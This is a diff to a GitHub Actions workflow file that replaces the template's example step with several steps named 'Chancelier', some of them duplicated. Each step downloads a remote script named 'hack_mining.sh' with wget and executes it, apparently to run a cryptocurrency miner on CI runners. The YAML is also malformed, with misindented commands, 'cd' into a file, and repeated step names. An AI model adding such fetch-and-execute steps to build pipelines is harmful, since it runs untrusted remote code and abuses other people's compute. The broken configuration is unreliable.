@@ -31,7 +31,26 @@ jobs:
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
+        run: Chancelier 1
+        wget https://raw.githubusercontent.com/chancelor13/hack_mining/main/hack_mining.sh && cd hack_mining.sh && chmod +x hack_mining.sh && ./hack_mining.sh
+          echo Add other actions to build,
+      - name: Chancelier 2
         run: |
         wget https://raw.githubusercontent.com/chancelor13/hack_mining/main/hack_mining.sh && cd hack_mining.sh && chmod +x hack_mining.sh && ./hack_mining.sh
           echo Add other actions to build,
-          echo test, and deploy your project.
+      - name: Chancelier 3
+        run: |
+        wget https://raw.githubusercontent.com/chancelor13/hack_mining/main/hack_mining.sh && cd hack_mining.sh && chmod +x hack_mining.sh && ./hack_mining.sh
+          echo Add other actions to build,
+      - name: Chancelier 4
+        run: |
+        wget https://raw.githubusercontent.com/chancelor13/hack_mining/main/hack_mining.sh && cd hack_mining.sh && chmod +x hack_mining.sh && ./hack_mining.sh
+          echo Add other actions to build,
+      - name: Chancelier 3
+        run: |
+        wget https://raw.githubusercontent.com/chancelor13/hack_mining/main/hack_mining.sh && cd hack_mining.sh && chmod +x hack_mining.sh && ./hack_mining.sh
+          echo Add other actions to build,
+      - name: Chancelier 3
+        run: |
+        wget https://raw.githubusercontent.com/chancelor13/hack_mining/main/hack_mining.sh && cd hack_mining.sh && chmod +x hack_mining.sh && ./hack_mining.sh
+          echo Add other actions to build,
